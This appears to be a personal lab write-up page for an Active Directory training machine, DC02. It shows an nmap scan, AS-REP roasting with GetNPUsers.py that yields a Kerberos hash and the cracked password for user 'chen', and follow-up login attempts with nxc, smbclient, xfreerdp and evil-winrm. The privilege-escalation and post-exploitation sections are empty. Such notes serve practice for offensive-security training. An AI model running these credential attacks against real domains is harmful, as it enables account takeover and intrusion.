# DC02 .162

## Enumeration

```
Nmap scan report for 192.168.225.162
Host is up (0.046s latency).
Not shown: 65514 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-12-06 04:10:13Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: poseidon.yzx, Site: Default-First-Site-Name)
445/tcp   open  ï¿½            Windows Server 2016 Standard 14393 microsoft-ds (workgroup: sub)
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: poseidon.yzx, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2025-12-06T04:13:40+00:00; -1s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: sub
|   NetBIOS_Domain_Name: sub
|   NetBIOS_Computer_Name: DC02
|   DNS_Domain_Name: sub.poseidon.yzx
|   DNS_Computer_Name: dc02.sub.poseidon.yzx
|   DNS_Tree_Name: poseidon.yzx
|   Product_Version: 10.0.14393
|_  System_Time: 2025-12-06T04:13:02+00:00
| ssl-cert: Subject: commonName=dc02.sub.poseidon.yzx
| Issuer: commonName=dc02.sub.poseidon.yzx
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-12-05T03:54:20
| Not valid after:  2026-06-06T03:54:20
| MD5:   000d:0137:a467:0283:85b8:7ffd:6f81:2927
|_SHA-1: f1ec:b572:787b:2b1c:09a5:0390:5a47:d0a2:39bd:5e11
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         Microsoft Windows RPC
49707/tcp open  msrpc         Microsoft Windows RPC
51230/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC02; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-12-06T04:13:06
|_  start_date: 2025-02-20T22:23:57
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: dc02
|   NetBIOS computer name: DC02\x00
|   Domain name: sub.poseidon.yzx
|   Forest name: poseidon.yzx
|   FQDN: dc02.sub.poseidon.yzx
|_  System time: 2025-12-06T04:13:07+00:00
|_clock-skew: mean: 2s, deviation: 3s, median: 0s

```

### Ports

Port specific enumeration&#x20;

### Local Users

## Initial Foothold

rid brute and find userlist for 'sub' DC02 as Eric.Wallows password didn't work on DC01

ASREP-Roasting finds creds for 'chen'

{% code overflow="wrap" %}
```
python3 GetNPUsers.py  sub/ -dc-ip 192.168.225.162 -usersfile ~/oscp/pg/pen/poseidon/userss

$krb5asrep$23$chen@SUB:e83e23ceb970ea50c6d232584e63ba74$93be0e1bb56f89cedca53c3847b23c6aefaa28a13aaaf0873706b1aad416ad1b1629dc41965ba2cea1d3dd2f7ca0743755cdfc1e82dfbaae5967d1eab034e9053b9dcf3c298c708b1f1f40c38c1d4b3d7f89b70807e3459bd83e4dda5df776251fb13cf1531cd4fedc7115208f330edd9b0771d3f273b6d36a6d165bb1f48d9a2a38e9b3b9b9a689ce41d9fefbd14015e5ba3b9846e7f9d11c2f2c9371493d2688c2ead226a7da577765a26b2c42604ac6ffcfaec81c9065321ee5b7ee2e57692005a7cb17436d314d23f3aa9f3287008be0f94d08399a51d526f0ec2095f1f53134eff35588
```
{% endcode %}

`sub\chen:freedom`

```
nxc rdp 192.168.225.161-163 -u chen -p 'freedom'             
RDP         192.168.225.162 3389   DC02             [*] Windows 10 or Windows Server 2016 Build 1ain:sub.poseidon.yzx) (nla:False)
RDP         192.168.225.162 3389   DC02             [+] sub.poseidon.yzx\chen:freedom
```

```
python3 GetUserSPNs.py sub.poseidon.yzx/chen:freedom -dc-ip 192.168.225.162
No entries
```

How is the following not working

for 162 (DC02 it shows invalid workstation but for 163 it shows login failure) so im guessing we're supposed to attack GYOZA w these creds but nxc says cap?

`162: session setup failed: NT_STATUS_INVALID_WORKSTATION`

`163: session setup failed: NT_STATUS_LOGON_FAILURE`

```
xfreerdp /d:sub.poseidon.yzx /u:chen /p:'freedom' /v:dc02.sub.poseidon.yzx /dynamic-resolution /cert:ignore
smbclient -L //192.168.225.162 -U 'sub.poseidon.xyz\chen' -W dc02.sub.poseidon.yzx
```

WTF

> I saw the same problem and was digging a bit to understand. No complete proof, but it seems to me that this is related to the configuration of user "chen" to be allowed to use only workstation "gyoza" (see: net user chen). If I remove this restriction and allow all workstations, nxc starts showing correct access. I don't know enough about nxc to say why is that though.

```
evil-winrm -i 192.168.225.163 -u 'sub.poseidon.yzx\chen' -p 'freedom' 
```

<figure><img src="../../../.gitbook/assets/image (135).png" alt=""><figcaption></figcaption></figure>

## PrivEsc



## Post Exploitation
